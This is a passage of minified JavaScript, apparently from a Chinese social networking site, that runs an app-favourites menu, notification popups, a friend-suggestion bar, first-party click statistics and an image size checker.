_4b6=document.createElement("dt");
}
_4a7.insertBefore(_4b6,list[6]||null);
$.css(_4b6,{display:(wpiMenuInfo.favoriteMenu.length>6?"block":"none")});
$.css($("wpi_collectionTitle"),{borderBottom:(list[0]?"1px solid #E3EEF9":"none")});
var _4b7=_4a9.getElementsByTagName("img")[0];
if(_4b7){
for(var i=0;i<list.length&&i<6;i++){
if(list[i].getElementsByTagName("img")[0].src==_4b7.src){
_4a9.innerHTML="";
break;
}
}
}
sendNewSerial();
},outLimit:function(top,left,offH,offW){
if(top<-offH||top>_4a7.offsetHeight){
return true;
}
return false;
}});
}
function createCutMove(){
_4ac=new _494({element:_4aa,getChilds:function(){
return _4aa.getElementsByTagName("a");
},getIndex:function(top,left,offH,offW){
return Math.ceil(left/offW);
},release:function(){
var list=_4aa.getElementsByTagName("a");
var _4c1=_4a7.getElementsByTagName("dd");
for(var i=0;i<list.length;i++){
_4a7.replaceChild($.wpi.createMenuItem(list[i]),_4c1[i]);
}
sendNewSerial();
},outLimit:function(top,left,offH,offW){
if(left<-offW||left>_4aa.offsetWidth){
return true;
}
return false;
}});
}
function bindEvents(){
_4a7=$("wpi_collectionApps");
_4a9=$("wpi_addCollection");
_4aa=$("wpi_shortCutsPanel");
_4a8=$("wpi_hitoryPanel");
createAppMove();
createCutMove();
_4a9.addEvent("click",function(e){
var app=_4a9.getElementsByTagName("a")[0];
if(app){
$.wpi.addApp($.wpi.parseShortCut(app));
}
XN.EVENT.stop(e||event);
});
$.wpi.addApp=function(data){
var menu=null;
var _4cb=_4a7.getElementsByTagName("dd");
for(var i=0;i<_4cb.length;i++){
if(_4cb[i].getElementsByTagName("a")[0].getAttribute("name")==data.id){
menu=_4cb[i];
break;
}
}
if(menu!=null&&i<6){
return;
}
if(menu==null){
menu=$.wpi.createMenuItem(data);
$.wpi.ajaxAddApp(wpiMenuInfo.currentApp[0].id);
}
_4a7.insertBefore(menu,_4cb[5]||null);
_4ab.config.release();
var _4cd=XN.dom.getElementsByClassName("icon","wpi_addCollection")[0];
if(_4cd&&_4cd.src==data.icon){
_4a9.innerHTML="";
}
};
_4a7.addEvent("click",function(e){
e=e||window.event;
var obj=e.target||e.srcElement;
if(obj.className=="del-handle"){
while(obj.tagName!="DD"){
obj=obj.parentNode;
}
var _4d0=document.createElement("div");
_4d0.innerHTML="<tt class=\"del-tip\">\u5df2\u79fb\u51fa\u6536\u85cf</tt><tt class=\"del-reroll\">\u64a4\u9500</tt>";
$.css(obj.getElementsByTagName("a")[0],{"display":"none"});
var _4d1=setTimeout(function(){
if(obj&&obj.parentNode){
$.wpi.ajaxDelApp(obj.getElementsByTagName("a")[0].name);
obj.parentNode.removeChild(obj);
_4ab.config.release();
}
},4000);
_4d0.timer=_4d1;
$.append(obj,_4d0);
XN.BROWSER.IE?(e.returnValue=false):e.preventDefault();
return false;
}else{
if(obj.className=="del-reroll"){
clearTimeout(obj.parentNode.timer);
var app=obj.parentNode.parentNode;
$.css(app.getElementsByTagName("a")[0],{"display":"block"});
$.css(obj.parentNode,{display:"none"});
setTimeout(function(){
app.removeChild(obj.parentNode);
},0);
XN.BROWSER.IE?(e.returnValue=false):e.preventDefault();
return false;
}
}
});
var _4d3=$("wpi_menuPanel");
var _4d4=$("wpi_menuEntry");
function toggleApp(e){
if(/\bm-chat-button-apps-active\b/.test(_4d4.className)){
$.css(_4d3,{display:"none"});
_4d4.delClass("m-chat-button-apps-active");
}else{
$.css(_4d3,{display:"block"});
_4d4.addClass("m-chat-button-apps-active");
}
$.clearRange();
var _4d6=$("newuserAppTip");
if(_4d6){
_4d6.remove();
}
}
$("wpi_minMenuPanel").addEvent("click",toggleApp);
$("wpi_togMenuPanel").addEvent("click",function(e){
if(!/\bm-chat-button-apps-active\b/.test(_4d4.className)&&parseInt(wpiMenuInfo.user.id)%10==0){
new XN.NET.xmlhttp({url:"http://apps."+XN.env.domain+"/menu/menustart.do?"+new Date().getTime(),method:"get"});
}
toggleApp(e);
});
var _4d8=$("wpiroot");
$(document).addEvent("click",function(e){
e=e||event;
var obj=e.target||e.srcElement;
while(obj!=_4d8&&obj.parentNode){
obj=obj.parentNode;
}
if(obj!=_4d8&&/\bm-chat-button-apps-active\b/.test(_4d4.className)){
toggleApp();
}
});
}
function getStruts(){
return ["<div id=\"wpi_myapp\" class=\"m-chat-button-con\" style=\"display:none;\">","<div id=\"wpi_menuEntry\" class=\"m-chat-button-apps\">","<div id=\"wpi_togMenuPanel\" class=\"m-chat-button-apps-text\">\u6211\u7684\u5e94\u7528","</div>","<div id=\"wpi_reflow\" style=\"display:none;\"></div>","<div id=\"wpi_menuPanel\" class=\"m-chat-window\"><div style=\"position:relative;z-index:2;\">","<div class=\"chat-head\">","<div class=\"head-btn\"><a title=\"\u9690\u85cf\u7a97\u53e3\" id=\"wpi_minMenuPanel\" class=\"minimize\" href=\"javascript:;\"></a></div>","<div class=\"head-name\">\u6211\u7684\u5e94\u7528</div>","</div>","<div class=\"chat-conv\">","<dl class=\"apps\"><dt>\u6700\u8fd1\u4f7f\u7528</dt></dl>","<dl id=\"wpi_hitoryPanel\" class=\"apps\"></dl>","<dl class=\"apps\"><dt id=\"wpi_collectionTitle\">\u6211\u7684\u6536\u85cf <a class=\"edit\" href=\"http://app."+XN.env.domain+"/apps/editapps.do?origin=",$.wpi.getBaseCode()*100+90,"\">\u7f16\u8f91</a></dt></dl>","<dl id=\"wpi_collectionApps\" class=\"apps\"></dl>","</div>","<div class=\"m-chat-notice footer\"><strong>\u62d6\u52a8\u8fdb\u884c\u6392\u5e8f</strong> <a class=\"more\" href=\"http://app."+XN.env.domain+"/app/apps/list?origin=",$.wpi.getBaseCode()*100+90,"\">\u6d4f\u89c8\u66f4\u591a\u5e94\u7528</a></div></div>","<iframe width=\"192\" height=\"100%\" frameBorder=\"0\" style=\"position:absolute;top:0;left:0;z-index:1;margin-left:-1px;opacity:0;filter:alpha(opacity=0);_height:expression(this.parentNode.offsetHeight);\"></iframe>","</div>","</div>","<div id=\"wpi_shortCutsPanel\" class=\"m-chat-button-links\"></div>","<div id=\"wpi_addCollection\" class=\"m-chat-button-links m-chat-button-shotcuts\"></div></div>"].join("");
}
function createStruts(){
var root=$("wpiroot").getElementsByTagName("div")[0];
$.append(root,getStruts());
}
function createRecentMenus(){
$("wpi_togMenuPanel").addEvent("click",function(){
if(!createRecentMenus.init){
for(var i=0;i<wpiMenuInfo.recentMenu.length&&i<9;i++){
$.append(_4a8,$.wpi.createHistroyItem(wpiMenuInfo.recentMenu[i]));
}
createRecentMenus.init=true;
}
});
}
function createFavoriteMenus(){
for(var i=0;i<wpiMenuInfo.favoriteMenu.length&&i<6;i++){
$.wpi.serial.push(wpiMenuInfo.favoriteMenu[i].id);
$.append(_4a7,$.wpi.createMenuItem(wpiMenuInfo.favoriteMenu[i]));
}
$("wpi_togMenuPanel").addEvent("click",function(){
if(!createFavoriteMenus.init){
for(var i=6;i<wpiMenuInfo.favoriteMenu.length;i++){
$.wpi.serial.push(wpiMenuInfo.favoriteMenu[i].id);
$.append(_4a7,$.wpi.createMenuItem(wpiMenuInfo.favoriteMenu[i]));
}
createFavoriteMenus.init=true;
}
});
}
function createShortcuts(){
_4ab.config.release();
}
function createStowShortcut(){
for(var i=0;i<wpiMenuInfo.currentApp.length;i++){
$.append(_4a9,$.wpi.createStowItem(wpiMenuInfo.currentApp[i]));
}
}
$.wpi.initApp=function(){
if(!window.wpiMenuInfo){
return;
}
createStruts();
bindEvents();
wpiMenuInfo.recentMenu=wpiMenuInfo.recentMenu.slice(0,9);
for(var i=0;i<wpiMenuInfo.favoriteMenu.length;i++){
for(var j=0;j<wpiMenuInfo.recentMenu.length;j++){
if(wpiMenuInfo.favoriteMenu[i].id==wpiMenuInfo.recentMenu[j].id){
wpiMenuInfo.recentMenu.splice(j,1);
break;
}
}
}
for(var i=0;i<wpiMenuInfo.favoriteMenu.length&&i<6;i++){
for(var j=0;j<wpiMenuInfo.currentApp.length;j++){
if(wpiMenuInfo.favoriteMenu[i].id==wpiMenuInfo.currentApp[j].id){
wpiMenuInfo.currentApp.splice(j,1);
break;
}
}
}
createRecentMenus();
createFavoriteMenus();
createShortcuts();
createStowShortcut();
};
$.wpi.showApp=function(){
if(!window.wpiMenuInfo){
return;
}
$.css($("wpi_myapp"),{display:"block"});
var _4e2=$("wpi_reflow");
if(XN.BROWSER.IE7&&_4e2){
$(window).addEvent("scroll",function(){
_4e2.innerHTML="";
});
}
};
$.wpi.hideApp=function(){
if(!window.wpiMenuInfo){
return;
}
$.css($("wpi_myapp"),{display:"none"});
};
})();
$.wpi.appNotify={element:null,init:function(){
if(this.element==null){
this.element=document.createElement("div");
this.element.className="notify-app";
this.element.innerHTML=["<div class=\"topbg\"></div>","<div class=\"innerCon\">","<h3></h3>","<a class=\"close\"><img src=\"http://xnimg.cn/imgpro/chat/notify-close.gif\" /></a>","<div class=\"desc\"></div>","<div class=\"action\">","<a href=\"javascript:;\" class=\"cancel\">\u53d6\u6d88\u53d1\u9001</a>","</div>","</div>","<div class=\"bottombg\"></div>","<iframe frameBorder=\"0\"></iframe>"].join("");
document.body.appendChild(this.element);
this.hackIe6();
var that=this;
var _4e4=this.element.getElementsByTagName("a");
_4e4[0].onclick=function(){
that.hide();
};
_4e4[_4e4.length-1].onclick=function(){
new XN.net.xmlhttp({url:"http://app."+XN.env.domain+"/app/notify/cancel",method:"post",data:"notifyId="+that.data.notifyId});
new XN.net.xmlhttp({url:"http://app."+XN.env.domain+"/app/notify/statistic/",method:"get",data:"op=2&app_id="+that.data.appId});
that.hide();
};
}
var _4e5=this.element.getElementsByTagName("h3")[0];
var _4e6="";
for(var i=0;i<this.data.receivers.length;i++){
var _4e8=this.data.receivers[i];
_4e6+="<a href=\"http://www."+XN.env.domain+"/profile.do?id="+_4e8.id+"\" target=\"_blank\">"+_4e8.name+"</a>";
if(i!=this.data.receivers.length-1){
_4e6+="\u3001";
}
}
_4e5.innerHTML="\u4f60\u5c06\u7ed9"+_4e6+(this.data.receivers.length>1?"\u7b49\u597d\u53cb":"")+"\u53d1\u9001\u4e00\u6761\u901a\u77e5";
var _4e9=XN.DOM.getElementsByClassName("desc",this.element)[0];
_4e9.innerHTML=this.data.content;
},hackIe6:function(){
if(XN.browser.IE6){
var that=this;
window.attachEvent("onscroll",function(){
that.element.className=that.element.className;
});
}
},show:function(data){
if(typeof data=="string"){
this.data=XN.json.parse(data);
}
this.init();
$(this.element).show();
var that=this;
for(var i=0;i<=20;i++){
(function(){
var j=i;
setTimeout(function(){
that.element.style.bottom=(that.easing(35*j,-107,137,700))+"px";
},35*j);
})();
}
var that=this;
setTimeout(function(){
that.hide();
},5500);
new XN.net.xmlhttp({url:"http://app."+XN.env.domain+"/app/notify/statistic/",method:"get",data:"op=1&app_id="+this.data.appId});
},hide:function(){
var that=this;
for(var i=0;i<=20;i++){
(function(){
var j=i;
setTimeout(function(){
that.element.style.bottom=(that.easing(35*j,30,-137,700))+"px";
j==20?$(that.element).hide():"";
},35*j);
})();
}
},easing:function(t,b,c,d){
return c*t/d+b;
}};
XN.dom.ready(function(){
if(!$("navSearchInput")){
return;
}
new XN.ui.friendSearchBar({input:"navSearchInput",submit:$("navSearchSubmit"),form:$("globalSearchForm"),params:{page:true},tip:"\u627e\u4eba\u3001\u516c\u5171\u4e3b\u9875"});
return;
if(!$("searchMenuAction")){
return;
}
new XN.ui.menu({bar:"searchMenuAction",menu:"searchdropdownMenu",fireOn:"mouseover",offsetX:1});
});
XN.app.statsMaster=function(){
};
XN.app.statsMaster.init=function(){
var j={};
j.ID=XN.cookie.get("id");
j.R=encodeURIComponent(location.href);
var _4f7=function(e){
var e=e||window.event,_X=XN.event.pointerX(e),Y=XN.event.pointerY(e),U,T,el=XN.event.element(e),_4fe=$("dropmenuHolder");
xx=XN.element.realLeft(_4fe);
if(!(el&&el.tagName)){
return;
}
T=el.tagName.toLowerCase();
if(T=="img"){
U=el.src;
}else{
if(T=="a"){
U=el.href;
}
}
var _t=el.getAttribute("stats");
if(_t){
T=_t;
}
j.X=_X-xx;
j.Y=Y;
if(U){
j.U=encodeURIComponent(U);
}
if(T){
j.T=T;
}
var rq=new Image();
rq.src="http://dj."+XN.env.domain+"/click?J="+XN.JSON.build(j)+"&t="+Math.random();
};
XN.event.addEvent(document,"mousedown",_4f7);
};
XN.dom.ready(XN.app.statsMaster.init);
XN.dom.ready(function(){
var _501=false;
var _502=true;
XN.event.addEvent(document,"mousedown",function(){
_502=false;
});
XN.event.addEvent(window,"blur",function(){
_502=true;
});
showConfirmDialog=function(){
XN.dom.disable();
var d=XN.DO.alert({title:"\u8bf7\u9886\u53d6\u60a8\u7684"+XN.env.siteName+"\u901a\u884c\u8bc1",message:"<iframe id=\"frameactive\" width=\"410\" height=\"100%\" frameborder=\"no\" scrolling=\"no\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" src=\"about:blank\" ></iframe>",width:454,params:{showCloseButton:true},callBack:function(){
_501=false;
showConfirmDialog.fireEvent("close");
}});
arguments.callee.dialog=d;
d.footer.hide();
$("frameactive").src="http://channel."+XN.env.domain+"/confirm/show";
};
XN.event.enableCustomEvent(showConfirmDialog);
var _504=setInterval(function(){
if(_502||window.noConfirmWindow||_501||!XN.cookie.get("noconfirm")){
return;
}
_501=true;
XN.cookie.del("noconfirm","/",XN.env.domain);
XN.cookie.del("noconfirm","/",window.location.hostname);
showConfirmDialog();
},1000);
XN.log("\u672a\u6fc0\u6d3b\u7528\u6237\u5f15\u5bfc\u521d\u59cb\u5316over");
});
var GuidBar={bar:null,list:[],addBar:function(){
if(window!=top||this.bar!=null){
return;
}
new XN.net.xmlhttp({url:"http://browse."+XN.env.domain+"/peoplebar.do?ran="+Math.random(),method:"get",onSuccess:function(r){
var _506=XN.json.parse(r.responseText);
if(_506.list.length>0){
GuidBar.buildStruts(_506);
}
}});
},buildStruts:function(obj){
this.list=obj.list;
var _508=["<div class=\"doing clearfix\">","<div class=\"userinfo clearfix\">","<a href=\"http://www."+XN.env.domain+"/profile.do?id="+obj.user.id+"\" class=\"avatar\">","<img src=\""+obj.user.head+"\" />","</a>","<h3>"+obj.user.name+"\uff0c\u4f60\u597d\uff01</h3>","<p>\u5f00\u59cb\u627e\u4f60\u7684\u597d\u53cb\u5427:</p>","</div>","<div class=\"users\">","<div class=\"arrow\"></div>","<ul></ul>","<div class=\"more\"><a href=\"http://friend."+XN.env.domain+"/myfriendlistx.do?_ua_flag=42&ref=guide_bar_more#item_1\">\u66f4\u591a &raquo;</a></div>","</div>","</div>"].join("");
var _509=this.bar=document.createElement("div");
_509.className="guide-top";
_509.innerHTML=_508;
var _50a=_509.getElementsByTagName("ul")[0];
for(var i=0,_50c=Math.min(this.list.length,5);i<_50c;i++){
_50a.appendChild(this.getFriend());
}
var _50d=$("navBar")||document.body.firstChild;
_50d.parentNode.insertBefore(_509,_50d);
},getFriend:function(){
var list=this.list;
if(!list[0]){
return null;
}
var _50f=document.createElement("li");
_50f.className="clearfix";
_50f.innerHTML=["<a href=\"#nogo\" class=\"shut\" title=\"\u5173\u95ed\"></a>","<span class=\"headpichold\">","<a href=\"http://www."+XN.env.domain+"/profile.do?ref=peoplebar&id="+list[0].id+"\" title=\"\u67e5\u770b"+list[0].name+"\u7684\u4e2a\u4eba\u4e3b\u9875\" target=\"_blank\">","<img src=\""+list[0].head+"\" onload=\"roundify(this)\"/>","</a>","</span>","<span>","<a href=\"http://www."+XN.env.domain+"/profile.do?ref=peoplebar&id="+list[0].id+"\" class=\"name\" target=\"_blank\">"+list[0].name+"</a>","<p><a href=\"#nogo\" onclick=\"showRequestFriendDialog('"+list[0].id+"','"+list[0].name+"','"+list[0].head+"','','sg_peoplebar');return false;\" class=\"addfriend_action\"> \u52a0\u4e3a\u597d\u53cb</a></p>","</span>"].join("");
_50f.firstChild.onclick=this.replaceFriend;
list.splice(0,1);
return _50f;
},replaceFriend:function(e){
e=e||window.event;
var obj=e.target||e.srcElement;
var node=obj.parentNode;
var _513=GuidBar.getFriend();
if(_513){
node.parentNode.replaceChild(_513,node);
}else{
$(node).remove();
}
return false;
}};
(function(ns){
ns.imgsChecker=function(_515,_516){
this.imgArry=_515;
this.filter=_516;
if(isUndefined(this.filter.logoWidth)){
this.filter.logoWidth=88;
}
if(isUndefined(this.filter.logoHeight)){
this.filter.logoHeight=31;
}
if(!this.filter.abortSec){
this.filter.abortSec=3;
}
if(!this.filter.maxCheckCount){
this.filter.maxCheckCount=30;
}
this.init();
};
ns.imgsChecker.prototype={init:function(){
var This=this;
this.result=[];
this.count=0;
this.stopFlag=false;
var _518=Math.min(This.filter.maxCheckCount,This.imgArry.length);
for(var i=0,j=_518;i<j;i++){
(function(_51b){
var img=new Image();
img.src=This.imgArry[_51b]+"?t="+Math.random();
img.loadedTag=false;
var _51d=setTimeout(function(){
if(This.count==This.filter.limitImgs||_51b==_518-1){
if(!This.stopFlag){
This.fireEvent("checkOver");
}
This.stopFlag=true;
return This.result;
}
},This.filter.abortSec*1000);
img.onload=function(){
img.loadedTag=true;
clearTimeout(_51d);
if(This.stopFlag){
return;
}
if(This.doFilter(this)){
This.fireEvent("checkOne",this);
This.result.push(this);
}
if(This.count==This.filter.limitImgs||_51b==_518-1){
This.fireEvent("checkOver");
This.stopFlag=true;
return This.result;
}
};
img.onerror=function(){
This.imgArry.splice(_51b,1);
if(This.count==This.filter.limitImgs||_51b==This.imgArry.length){
if(!This.stopFlag){
This.fireEvent("checkOver");
}
This.stopFlag=true;
return This.result;
}
};
})(i);
}
},doFilter:function(img){
if(img.width==this.logoWidth||img.height==this.logoHeight){
this.count++;
return true;
}
if(img.width<this.filter.minWidth||img.height<this.filter.minHeight){
return false;
}
var _51f=img.width/img.height;
var _520=img.height/img.width;
if(_51f>this.filter.maxRatioWH||_520>this.filter.maxRatioHW){
return false;
}
this.count++;
return true;
}};
XN.event.enableCustomEvent(ns.imgsChecker.prototype);
})(XN.widgets);

